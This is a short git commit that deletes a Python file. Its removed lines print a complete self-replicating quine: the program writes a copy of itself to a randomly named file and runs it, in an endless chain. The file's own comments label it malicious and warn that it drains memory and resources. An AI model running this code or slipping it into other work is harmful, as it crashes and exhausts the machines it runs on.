04754b60a7b228669b7f67390bab3a66e9828e8b
Le Zhang <lezhangisu@gmail.com>
2018-08-24 15:37:08 -0500

    delete old file

--- Quine/quine-infinite_mutate.py
+++
@@ -1,4 +0,0 @@
-# This program is MALICIOUS!!!!
-# DO NOT run this on any working machine. It will eat up ALL your memory. Run it with VMs.
-# It replicates itself to a randomly-named file and runs it. That means, this chain never ends until it drains all your resources.
-import os;import random;fn="".join([str(rand) for rand in random.sample(xrange(100), 10)]);s='import os;import random;fn="".join([str(rand) for rand in random.sample(xrange(100), 10)]);s=%r;open(fn+".py", "w").write(s%%s);print(s%%s);os.system("python "+fn+".py")';open(fn+".py", "w").write(s%s);print(s%s);os.system("python "+fn+".py")
